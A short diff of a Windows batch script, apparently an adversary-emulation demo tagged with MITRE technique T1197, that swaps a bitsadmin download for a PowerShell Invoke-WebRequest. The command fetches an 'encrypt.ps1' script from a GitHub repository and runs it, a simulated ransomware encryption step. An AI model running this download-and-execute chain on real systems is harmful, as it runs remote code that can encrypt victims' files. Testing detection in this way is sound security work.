@@ -10,7 +10,8 @@ pause
 
 echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1197 - Bitsadmin Download executable file
 echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] Run encryption
-bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/dunghoangtrong/hsoc-demo/master/encrypt.ps1 %temp%\encrypt.ps1
+::bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/dunghoangtrong/hsoc-demo/master/encrypt.ps1 %temp%\encrypt.ps1
+powershell -c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dunghoangtrong/hsoc-demo/master/encrypt.ps1" -OutFile "%temp%\encrypt.ps1"
 start "" cmd /c powershell -executionpolicy remotesigned -File %temp%\encrypt.ps1
 
 pause
